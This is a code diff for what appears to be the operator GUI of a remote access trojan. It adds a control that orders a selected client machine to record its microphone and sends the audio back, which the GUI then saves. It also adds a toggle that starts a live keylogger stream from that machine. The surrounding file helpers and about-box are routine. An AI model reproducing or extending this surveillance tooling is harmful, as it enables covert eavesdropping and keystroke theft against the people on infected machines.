@@ -240,6 +240,100 @@ def show_original_size(image):
         messagebox.showerror("Error", str(e))
 
 
+# ── Microphone / Audio ─────────────────────────────────────────────────────────
+
+def capture_microphone():
+    """Request microphone audio recording from client."""
+    if not g.active_client_id:
+        messagebox.showerror("No Client", "Please select a client!")
+        return
+    duration = tk.simpledialog.askinteger("Microphone Recording", "Recording duration in seconds:", initialvalue=10, minvalue=1, maxvalue=60)
+    if duration is None:
+        return
+    g.terminal_output.delete("input_start", "end")
+    g.terminal_output.insert(tk.END, f"🎤 Requesting audio recording ({duration}s)...\n", "loading")
+    g.terminal_output.mark_set("input_start", "end-1c")
+    import gui_commands as cmds
+    threading.Thread(target=cmds.execute_command, args=(f"MICROPHONE:{duration}", f"Microphone: {duration}s"), daemon=True).start()
+
+
+def save_audio_file(audio_data_b64, duration, sample_rate):
+    """Prompt user to save a received audio recording — converts to MP3 automatically."""
+    try:
+        audio_data = base64.b64decode(audio_data_b64)
+
+        ask = messagebox.askyesno(
+            "🎤 Recording Complete",
+            f"Audio recorded successfully! ({duration}s, {len(audio_data) / 1024:.0f}KB)\n\nSave audio file?",
+            icon="question"
+        )
+        if not ask:
+            return
+
+        saved = False
+        save_path = None
+
+        # ── Try MP3 via pydub ──────────────────────────────────────────────
+        try:
+            from pydub import AudioSegment
+            import io as _io
+
+            wav_io = _io.BytesIO(audio_data)
+            segment = AudioSegment.from_wav(wav_io)
+
+            save_path = filedialog.asksaveasfilename(
+                defaultextension=".mp3",
+                filetypes=[("MP3 Audio", "*.mp3"), ("WAV Audio", "*.wav"), ("All Files", "*.*")],
+                initialfile=f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp3"
+            )
+            if save_path:
+                if save_path.lower().endswith(".mp3"):
+                    segment.export(save_path, format="mp3", bitrate="192k")
+                else:
+                    segment.export(save_path, format="wav")
+                saved = True
+
+        except ImportError:
+            pass
+        except Exception:
+            pass
+
+        # ── Fallback: save raw WAV ─────────────────────────────────────────
+        if not saved:
+            save_path = filedialog.asksaveasfilename(
+                defaultextension=".wav",
+                filetypes=[("WAV Audio", "*.wav"), ("All Files", "*.*")],
+                initialfile=f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
+            )
+            if save_path:
+                with open(save_path, 'wb') as f:
+                    f.write(audio_data)
+                saved = True
+
+        if saved and save_path:
+            size_mb = os.path.getsize(save_path) / (1024 * 1024)
+            ext = os.path.splitext(save_path)[1].upper()
+            g.terminal_output.insert(tk.END, f"✓ Audio saved: {save_path} ({size_mb:.2f}MB, {duration}s) [{ext}]\n", "success")
+            log_message(f"Audio saved: {save_path} ({size_mb:.2f}MB, {duration}s)", "SUCCESS")
+
+            try:
+                import platform as _plat
+                if _plat.system() == "Windows":
+                    os.startfile(save_path)
+                elif _plat.system() == "Darwin":
+                    import subprocess
+                    subprocess.run(["open", save_path], check=False)
+                else:
+                    import subprocess
+                    subprocess.run(["xdg-open", save_path], check=False)
+            except Exception:
+                pass
+
+    except Exception as e:
+        g.terminal_output.insert(tk.END, f"❌ Save failed: {str(e)}\n", "error")
+        log_message(f"Audio save error: {e}", "ERROR")
+
+
 # ── File Transfer ─────────────────────────────────────────────────────────────
 
 def save_downloaded_file(filename, data_b64):
@@ -339,3 +433,26 @@ def show_about():
     features.config(state="disabled")
     tk.Label(about, text="© 2026 Nirupam Pal", font=("Segoe UI", 10), bg="#1E1E1E", fg="#757575").pack(pady=15)
     tk.Button(about, text="Close", command=about.destroy, font=("Segoe UI", 11, "bold"), bg="#1976D2", fg="white", relief="flat", padx=40, pady=10, cursor="hand2").pack(pady=15)
+
+
+# ── Keylog / Keyboard Live-Stream ──────────────────────────────────────────────
+
+def capture_keylog():
+    """Toggle keylog live-stream on/off."""
+    if not g.active_client_id:
+        messagebox.showerror("No Client", "Please select a client!")
+        return
+
+    import gui_commands as cmds
+
+    if not g.keylog_active:
+        g.keylog_active = True
+        btn = g.keylog_button
+        if btn:
+            btn.config(text="⏹ Stop Keylog", bg="#D32F2F")
+        g.terminal_output.delete("input_start", "end")
+        g.terminal_output.insert(tk.END, "⌨️ Keylog live-stream started — press 'Stop Keylog' to end\n", "loading")
+        g.terminal_output.mark_set("input_start", "end-1c")
+        threading.Thread(target=cmds.start_keylog_stream, daemon=True).start()
+    else:
+        cmds.stop_keylog()
